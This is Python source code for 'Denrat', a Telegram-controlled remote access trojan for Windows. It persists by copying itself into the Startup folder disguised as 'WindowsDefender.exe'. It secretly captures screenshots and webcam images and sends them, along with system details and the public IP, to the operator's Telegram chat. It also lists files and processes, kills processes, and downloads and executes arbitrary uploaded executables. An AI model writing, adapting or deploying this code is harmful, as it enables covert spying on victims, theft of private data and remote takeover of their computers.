import requests
import platform
import telebot
import os
import sys
import webbrowser
import json
import cv2
import requests as r
import subprocess
from PIL import ImageGrab
from telebot import util
from telebot import types
from subprocess import Popen, PIPE
import getpass
import shutil
import zipfile

USER_NAME = getpass.getuser()
WORK_DIR = r'C:\Users\%s\AppData\Roaming\\' % USER_NAME

if os.path.exists(WORK_DIR+"denrat"):
	pass
else:
	os.mkdir(WORK_DIR+"denrat")
	os.mkdir(WORK_DIR+"denrat\\modules")

def add_to_startup(file_path=""):
	proc_name = os.path.basename(__file__)
	if file_path == "":
		file_path = os.path.dirname(os.path.realpath(__file__))+f"\\{proc_name}"
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	shutil.copyfile(file_path, bat_path+"\\WindowsDefender.exe")


token = ''
id_chat = '0'
owner_id = "0"

bot = telebot.TeleBot(token, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)


@bot.message_handler(commands=['start', 'Start'])
@bot.message_handler(chat_id=owner_id)
def start(commands):
	bot.send_message(id_chat, 'Denrat' +
		'\n\nCommand list /help' +
		'\n\nCoded by D3Nv3R AvoCoder | Opa Opa this is my PC')


@bot.message_handler(commands=['help', 'Help'])
@bot.message_handler(chat_id=owner_id)
def help(command):
	bot.send_message(id_chat, 'Commands: \n /screen - ScreenShot \n /info - Information about computer \n /open_url - Open WebSite' +
		'\n /ls - List dir \n /kill_process + name process \n /webcam - WebcamShot \n /tasklist - Process List \n /pwd - Get current path \n '+
		'/killme - Kill bot server \n /ctosup - Copy bot to startup \n /delfsyp - delete from startup \n <file with caption> - to upload module'+
		'\n /runmodule <name> - to run module')

@bot.message_handler(commands=["killme"])
@bot.message_handler(chat_id=owner_id)
def killme(command):
	raise "We close script!"

@bot.message_handler(commands=["ctosup"])
@bot.message_handler(chat_id=owner_id)
def ctosup(command):
	dir = os.path.abspath(os.getcwd())
	proc_name = os.path.basename(__file__)
	add_to_startup()
	bot.send_message(id_chat, 'Success copied!')

@bot.message_handler(commands=["delfsyp"])
@bot.message_handler(chat_id=owner_id)
def delfsyp(command):
	try:
		file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
		os.remove(file_path+"\\WindowsDefender.exe")
	except:
		pass
	finally:
		bot.send_message(id_chat, 'Success deleted!')

@bot.message_handler(commands=['info', 'Info'])
@bot.message_handler(chat_id=owner_id)
def info_send(command):
	try:
		username = os.getlogin()

		r = requests.get('http://ip.42.pl/raw')
		ip = r.text
		windows = platform.platform()
		processor = platform.processor()

		bot.send_message(id_chat, 'PC: ' + username + '\nIP: ' + ip + '\nOS: ' + windows + '\nProcessor: ' + processor)
	except:
		bot.send_message(id_chat, 'Error')


@bot.message_handler(commands=['screen', 'Screen'])
@bot.message_handler(chat_id=owner_id)
def send_screen(command):
	try:
		screen = ImageGrab.grab()
		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
		files = {'photo': screen}
		bot.send_photo(id_chat, screen)
	except:
		bot.send_photo(id_chat, 'Error')


@bot.message_handler(commands=['open_url'])
@bot.message_handler(chat_id=owner_id)
def open_url(message):
	user_msg = '{0}'.format(message.text)
	url = user_msg.split(' ')[1]
	try:
		webbrowser.open_new_tab(url)
	except:
		bot.send_message(id_chat, 'Error')


@bot.message_handler(commands=['pwd', 'Pwd'])
@bot.message_handler(chat_id=owner_id)
def pwd(command):
	dir = os.path.abspath(os.getcwd())
	bot.send_message(id_chat, 'Pwd: \n' + (str(dir)))


@bot.message_handler(commands=['ls', 'Ls'])
@bot.message_handler(chat_id=owner_id)
def ls_dir(command):
	try:
		dirs = '\n'.join(os.listdir(path='.'))
		bot.send_message(id_chat, 'Files: ' + '\n' + dirs)
	except:
		bot.send_message(id_chat, 'Error')


@bot.message_handler(commands=['kill_process', 'Kill_process'])
@bot.message_handler(chat_id=owner_id)
def kill_process(message):
	try:
		user_msg = '{0}'.format(message.text)
		subprocess.call('taskkill /IM ' + user_msg.split(' ')[1])
		bot.send_message(id_chat, 'Good!')
	except:
		bot.send_message(id_chat, 'Error!')


@bot.message_handler(commands=['webcam', 'Webcam'])
@bot.message_handler(chat_id=owner_id)
def webcam(command):
	try:
		cap = cv2.VideoCapture(0)
		for i in range(30):
			cap.read()

		ret, frame = cap.read()
		cv2.imwrite(os.environ['ProgramData'] + '\\WebCam.jpg', frame)

		bot.send_chat_action(id_chat, 'upload_photo')
		cap.release()

		webcam = open(os.environ['ProgramData'] + '\\WebCam.jpg', 'rb')
		bot.send_photo(id_chat, webcam)
		webcam.close()

	except:
		bot.send_chat_action(id_chat, 'typing')
		bot.send_message(id_chat, '*Webcam not found*', parse_mode="Markdown")


@bot.message_handler(commands=['tasklist', 'Tasklist'])
@bot.message_handler(chat_id=owner_id)
def tasklist(command):
	try:
		bot.send_chat_action(id_chat, 'typing')

		prs = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
		pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]

		pr_string = '\n'.join(pr_list)
		bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")

	except:
		bot.send_message(id_chat, '*Not Found*', parse_mode="Markdown")

@bot.message_handler(commands=['runmodule'])
@bot.message_handler(chat_id=owner_id)
def runmodule(message):
	module_dir =  WORK_DIR+"denrat\\modules\\"
	if (message.text).split()[1] in os.listdir(module_dir):
		files = module_dir+"\\"+(message.text).split()[1]+'\\main.exe'
		print(files)
		os.system(files)
		bot.send_message(message.chat.id, "[*] success - module runned")
	else:
		bot.send_message(message.chat.id, "[!] error - module don`t exits")

@bot.message_handler(content_types=['document'])
@bot.message_handler(chat_id=owner_id)
def send_text(message):
	try:
		try:
			if not message.caption:
				raise "Dont have caption"
			module_name = message.caption
			save_dir = WORK_DIR+"denrat\\modules\\"
			os.mkdir(save_dir + f"\\{module_name}")
			save_dir = save_dir + f"{module_name}"
		except:
			bot.send_message(id_chat, "Please enter module name in caption!")
			return
		file_name = message.document.file_name
		tunzip = False
		if file_name[-3:] == "zip":
			tunzip = True
		file_id = message.document.file_name
		file_id_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_id_info.file_path)
		src = file_name
		with open(save_dir + "/" + src, 'wb') as new_file:
			new_file.write(downloaded_file)
		if tunzip:
			with zipfile.ZipFile(save_dir + "/" + src, 'r') as zip_ref:
				zip_ref.extractall(save_dir + "/")
			os.remove(save_dir + "/" + src)
		if "main.exe" not in os.listdir(save_dir + "/"):
			bot.send_message(message.chat.id, "[!] error - file main.exe not found, module not correct")
			shutil.rmtree(save_dir+"/", ignore_errors=True)
			return
		bot.send_message(message.chat.id, "[*] Module added:\nFile name - {}\nFile directory - {}".format(str(file_name), str(save_dir)))
	except Exception as ex:
		bot.send_message(message.chat.id, "[!] error - {}".format(str(ex)))

bot.send_message(id_chat, "Denrat started on new machine!")

bot.polling()
